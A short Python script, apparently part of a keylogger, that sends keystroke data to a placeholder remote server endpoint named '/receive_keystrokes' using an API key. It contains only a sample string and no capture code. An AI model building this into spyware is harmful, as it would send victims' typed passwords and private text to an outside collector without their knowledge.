import requests

# Server URL and API Key
server_url = "http://<server_ip>:8080/receive_keystrokes"
api_key = "your_secure_api_key"

# Example keystroke data
keystroke_data = "Sample keystroke data"

# Headers with API Key
headers = {
    'Content-Type': 'text/plain',
    'x-api-key': api_key
}

# Send the data
response = requests.post(server_url, headers=headers, data=keystroke_data)
if response.status_code == 200:
    print("Data sent successfully!")
else:
    print(f"Failed to send data. Status Code: {response.status_code}")
